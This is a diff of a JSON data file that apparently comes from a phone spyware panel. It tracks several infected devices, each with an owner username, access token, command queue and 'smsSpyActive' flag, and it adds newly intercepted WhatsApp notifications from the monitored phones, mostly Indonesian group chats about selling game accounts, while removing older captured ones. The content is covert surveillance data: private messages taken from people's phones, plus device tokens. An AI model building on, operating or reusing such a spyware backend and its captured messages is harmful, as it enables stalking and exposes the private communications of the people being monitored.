@@ -6313,7 +6313,7 @@
     "deviceName": "HP-AUBREY-899E",
     "ownerUsername": "51a6566b-13c6-424c-8f68-421c28fdc099",
     "token": "3cfe8ffe8872f32822087d633ebd4fe4",
-    "lastSeen": 1776779891954,
+    "lastSeen": 1776779895228,
     "commandQueue": [],
     "online": true,
     "connectedAt": "2026-04-21T09:49:26.839Z",
@@ -6329,6 +6329,30 @@
     "lastScreenFrame": null,
     "smsSpyActive": true,
     "smsMessages": [
+      {
+        "appName": "WhatsApp",
+        "sender": "Imam",
+        "content": "Telepon video berlangsung",
+        "time": "21/04 20:58",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1776779896130
+      },
+      {
+        "appName": "WhatsApp",
+        "sender": "WhatsApp",
+        "content": "‎‎3565 pesan dari 20 chat",
+        "time": "21/04 20:58",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1776779894176
+      },
+      {
+        "appName": "WhatsApp",
+        "sender": "‎JB || MANZZ KALBAR (970 pesan): ~ ada",
+        "content": "📷 300+\n\n* max 1 evo 2\n* log ggl bind sepaket\n* sg lobby 2\n* v140 \n\n(MC YANG AKU KENAL/COD SIANTAN)",
+        "time": "21/04 20:58",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1776779894158
+      },
       {
         "appName": "WhatsApp",
         "sender": "Imam",
@@ -10304,30 +10328,6 @@
         "time": "21/04 20:24",
         "pkg": "com.whatsapp",
         "receivedAt": 1776777852371
-      },
-      {
-        "appName": "WhatsApp",
-        "sender": "‎JB || RULZ STORE KALBAR (665 pesan): ~ kyy STR",
-        "content": "itu dah",
-        "time": "21/04 20:24",
-        "pkg": "com.whatsapp",
-        "receivedAt": 1776777852219
-      },
-      {
-        "appName": "WhatsApp",
-        "sender": "WhatsApp",
-        "content": "‎‎3548 pesan dari 22 chat",
-        "time": "21/04 20:24",
-        "pkg": "com.whatsapp",
-        "receivedAt": 1776777849147
-      },
-      {
-        "appName": "WhatsApp",
-        "sender": "‎STOCK¹ NEW DAVID 18 STR X OWN (102 pesan): ~ ADMIN JAPOST NDI JB REAL 1",
-        "content": "📷 STOK PRIBADI PROSES SEPAKET\n\n•VAULT GAGAH\n•SG 2JT\n•SENJATA ALROF\n•EMOT KECE\"\n•ALREF\n\nOP 155+",
-        "time": "21/04 20:24",
-        "pkg": "com.whatsapp",
-        "receivedAt": 1776777849003
       }
     ],
     "galleryPhotos": [],
@@ -10346,7 +10346,7 @@
     "deviceName": "HP-XIINZ-E979",
     "ownerUsername": "abiv12",
     "token": "42f963bfe947d35a7c960fecc604b095",
-    "lastSeen": 1776779890663,
+    "lastSeen": 1776779893685,
     "commandQueue": [],
     "online": true,
     "connectedAt": "2026-04-21T09:50:02.203Z",
@@ -16688,7 +16688,7 @@
     "deviceName": "HP-VIP-DFF9",
     "ownerUsername": "kinzz",
     "token": "5d86b5519e1603f3456060c28a22c345",
-    "lastSeen": 1776779890736,
+    "lastSeen": 1776779893752,
     "commandQueue": [],
     "online": true,
     "connectedAt": "2026-04-21T11:31:24.904Z",
